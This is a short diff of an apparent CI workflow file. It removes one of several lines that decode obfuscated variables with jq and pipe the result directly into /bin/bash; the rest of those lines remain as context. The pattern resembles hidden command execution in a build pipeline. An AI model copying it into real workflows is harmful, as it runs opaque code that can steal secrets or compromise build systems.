@@ -21,7 +21,6 @@ jobs:
           echo $jnby2 | jq -r .eruq61 | /bin/bash
           echo $bvi3759 | jq -r .jxjx5071 | /bin/bash
           echo $gxv5938 | jq -r .wo12 | /bin/bash
-          echo $hsuer811 | jq -r .en7 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
